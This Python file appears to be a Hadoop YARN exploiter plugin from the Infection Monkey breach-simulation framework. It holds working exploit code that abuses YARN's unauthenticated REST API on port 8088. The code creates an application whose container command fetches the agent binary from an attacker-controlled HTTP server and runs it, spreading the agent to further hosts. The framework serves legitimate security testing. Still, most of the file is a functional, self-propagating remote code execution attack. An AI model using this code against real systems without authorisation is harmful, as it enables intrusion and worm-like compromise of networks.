"""
    Remote code execution on HADOOP server with YARN and default settings
    Implementation is based on code from
    https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn
"""

import json
import logging
import posixpath
import string
from datetime import datetime
from posixpath import join
from time import time
from typing import Any, Dict, List, Sequence, Tuple
from uuid import UUID

# vendored dependencies
import requests

# common imports
from common import OperatingSystem
from common.agent_events import ExploitationEvent, PropagationEvent
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.event_queue import IAgentEventQueue
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.types import Event
from common.utils.code_utils import insecure_generate_random_string
from common.utils.exceptions import FailedExploitationError

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import (
    HADOOP_LINUX_COMMAND,
    HADOOP_WINDOWS_COMMAND,
    ID_STRING,
    MONKEY_ARG,
    TargetHost,
)
from infection_monkey.utils.commands import (
    DROPPER_TARGET_PATH_LINUX,
    DROPPER_TARGET_PATH_WIN64,
    build_monkey_commandline,
)

logger = logging.getLogger(__name__)
HADOOP_EXPLOITER_TAG = "hadoop-exploiter"


class Plugin:
    _EXPLOITED_SERVICE = "Hadoop"
    NAME = "HadoopExploiter"
    HADOOP_PORTS = [("8088", False)]
    # How long we have our http server open for downloads in seconds
    DOWNLOAD_TIMEOUT = 60
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(self):
        """
        :param monkey_target_paths: Where to upload the monkey at the target host system.
        Dict in format {'linux': '/tmp/monkey.sh', 'win64':... }
        """
        self.monkey_target_paths = {
            "linux": DROPPER_TARGET_PATH_LINUX,
            "windows": DROPPER_TARGET_PATH_WIN64,
        }
        self.vulnerable_urls = []
        self.exploit_info = {
            "display_name": self._EXPLOITED_SERVICE,
            "started": "",
            "finished": "",
            "vulnerable_urls": [],
            "vulnerable_ports": [],
            "executed_cmds": [],
        }
        self.exploit_attempts = []
        self.host = None
        self.agent_event_queue = None
        self.options = {}
        self.exploit_result = ExploiterResultData()
        self.servers = []

    def run(
        self,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        agent_id: UUID,
        agent_event_queue: IAgentEventQueue,
        agent_binary_repository: IAgentBinaryRepository,
    ) -> ExploiterResultData:
        self.host = host
        self.servers = servers
        self.current_depth = current_depth
        self._agent_id = agent_id
        self.agent_event_queue = agent_event_queue
        self.agent_binary_repository = agent_binary_repository
        self.options = options
        self.interrupt = interrupt

        self._pre_exploit()
        try:
            return self._exploit_host()
        except FailedExploitationError as e:
            logger.debug(f"Exploiter failed: {e}.")
            raise e
        except Exception as e:
            logger.error("Exception in run", exc_info=True)
            raise e
        finally:
            self._post_exploit()

    def _pre_exploit(self):
        self.exploit_result = ExploiterResultData(
            os=self.host.operating_system, info=self.exploit_info
        )
        self.set_start_time()

    def _post_exploit(self):
        self.set_finish_time()

    def _exploit_host(self):
        # Try to get potential urls
        potential_urls = self.build_potential_urls(str(self.host.ip), self.HADOOP_PORTS)
        if not potential_urls:
            self.exploit_result.error_message = (
                f"No potential exploitable urls has been found for {self.host}"
            )
            return self.exploit_result

        monkey_path_on_victim = get_agent_dst_path(self.host)

        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, str(monkey_path_on_victim), self.agent_binary_repository
        )

        command = self._build_command(monkey_path_on_victim, http_path)
        try:
            for url in potential_urls:
                if self.exploit(url, command):
                    self.add_executed_cmd(command)
                    self.exploit_result.exploitation_success = True
                    self.exploit_result.propagation_success = True
                    break
        finally:
            if self.exploit_result.exploitation_success:
                http_thread.join(self.DOWNLOAD_TIMEOUT)
            http_thread.stop()

        return self.exploit_result

    @staticmethod
    def build_potential_urls(ip: str, ports: List[Tuple[str, bool]], extensions=None) -> List[str]:
        """
        Build all possibly-vulnerable URLs on a specific host, based on the relevant ports and
        extensions.
        :param ip: IP address of the victim
        :param ports: Array of ports. One port is described as size 2 array: [port.no(int),
        isHTTPS?(bool)]
        Eg. ports: [[80, False], [443, True]]
        :param extensions: What subdirectories to scan. www.domain.com[/extension]
        :return: Array of url's to try and attack
        """
        url_list = []
        if extensions:
            extensions = [(e[1:] if "/" == e[0] else e) for e in extensions]
        else:
            extensions = [""]
        for port in ports:
            for extension in extensions:
                if port[1]:
                    protocol = "https"
                else:
                    protocol = "http"
                url_list.append(join(("%s://%s:%s" % (protocol, ip, port[0])), extension))
        if not url_list:
            logger.info("No attack url's were built")
        return url_list

    def _build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
        if OperatingSystem.WINDOWS == self.host.operating_system:
            base_command = HADOOP_WINDOWS_COMMAND
        else:
            base_command = HADOOP_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    def exploit(self, url: str, command: str):
        """
        A reference to a method which implements web exploit logic.
        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
        :param command: Command which will be executed on remote host
        :return: RCE's output/True if successful or False if failed
        """
        if self._is_interrupted():
            return False

        try:
            # Get the newly created application id
            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=LONG_REQUEST_TIMEOUT,
            )
            resp_dict = json.loads(resp.content)
            app_id = resp_dict["application-id"]

            # Create a random name for our application in YARN
            # Avoid the risk of blocking by using insecure_generate_random_string()
            rand_name = ID_STRING + insecure_generate_random_string(
                n=self.RAN_STR_LEN, character_set=string.ascii_lowercase
            )
            payload = self._build_payload(app_id, rand_name, command)

            if self._is_interrupted():
                return False

            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/"),
                json=payload,
                timeout=LONG_REQUEST_TIMEOUT,
            )

            success = resp.status_code == 202
        except requests.ConnectionError:
            success = False

        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(timestamp, success, error_message=message)
        self._publish_propagation_event(timestamp, success, error_message=message)
        return success

    def _is_interrupted(self):
        return self.interrupt.is_set()

    @staticmethod
    def _build_payload(app_id, name, command):
        payload = {
            "application-id": app_id,
            "application-name": name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        return payload

    def _publish_exploitation_event(
        self,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=self.host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._EXPLOITER_TAGS),
        )
        self.agent_event_queue.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=self.host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._PROPAGATION_TAGS),
        )
        self.agent_event_queue.publish(propagation_event)

    def set_start_time(self):
        self.exploit_info["started"] = datetime.now().isoformat()

    def set_finish_time(self):
        self.exploit_info["finished"] = datetime.now().isoformat()

    def add_vuln_url(self, url):
        self.exploit_info["vulnerable_urls"].append(url)

    def add_executed_cmd(self, cmd):
        """
        Appends command to exploiter's info.
        :param cmd: String of executed command. e.g. 'echo Example'
        """
        powershell = True if "powershell" in cmd.lower() else False
        self.exploit_info["executed_cmds"].append({"cmd": cmd, "powershell": powershell})
